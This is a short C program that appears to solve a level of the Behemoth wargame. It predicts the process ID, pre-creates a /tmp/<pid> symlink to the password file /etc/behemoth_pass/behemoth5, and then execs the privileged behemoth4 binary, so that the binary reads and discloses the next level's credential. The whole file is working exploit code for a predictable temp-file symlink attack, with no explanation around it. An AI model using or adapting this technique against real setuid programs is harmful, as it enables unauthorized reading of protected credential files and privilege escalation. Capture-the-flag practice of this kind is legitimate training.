#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void create_pid_file(char *name) {
  int curr_pid = getpid();
  sprintf(name, "/tmp/%d", curr_pid);
  symlink("/etc/behemoth_pass/behemoth5", name);
}

int main() {
  char name[50];
  create_pid_file(name);

  char *args[] = {"/behemoth/behemoth4", NULL};
  execv("/behemoth/behemoth4", args);
}
